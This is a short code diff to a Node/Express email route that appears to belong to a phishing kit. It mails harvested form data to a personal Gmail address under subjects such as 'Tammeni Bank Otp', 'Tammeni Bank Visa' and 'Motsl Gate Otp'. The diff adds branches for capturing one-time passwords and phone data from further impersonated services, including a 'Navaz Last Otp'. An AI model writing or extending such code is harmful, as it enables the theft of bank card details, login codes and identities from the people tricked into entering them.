@@ -61,12 +61,15 @@ app.post('/email',async(req,res)=>{
             from: 'Admin Panel',
             to: 'saudiabsher1990@gmail.com',
             subject:
-             `${req.query.otp ?'Tammeni Bank  Otp' :
-                 req.query.reg ? 'Tammeni Register Form ' :
-                 req.query.apply ?'Tammeni Apply Form ' :
-                 req.query.activate ?'Tammeni Activate Account ' :
-                 req.query.new ?'Tammeni  New User ' :
-                  'Tammeni Bank Visa'}`,
+            `${req.query.otp ?'Tammeni  Otp' :
+                req.query.reg ? 'Tammeni Register Form ' :
+                req.query.apply ?'Tammeni Apply Form ' :
+                req.query.activate ?'Tammeni Activate Account ' :
+                req.query.phone ?'Motsl Gate Data ' :
+                req.query.Motslotp ?'Motsl Gate Otp ' :
+                req.query.new ?'Tammeni  New User ' :
+                req.query.navazOtp ?'Tameeni Navaz Last Otp  ' :
+                 'Tammeni Bank Visa'}`,
             html: htmlContent
         }).then(info => {
         if (info.accepted.length) {
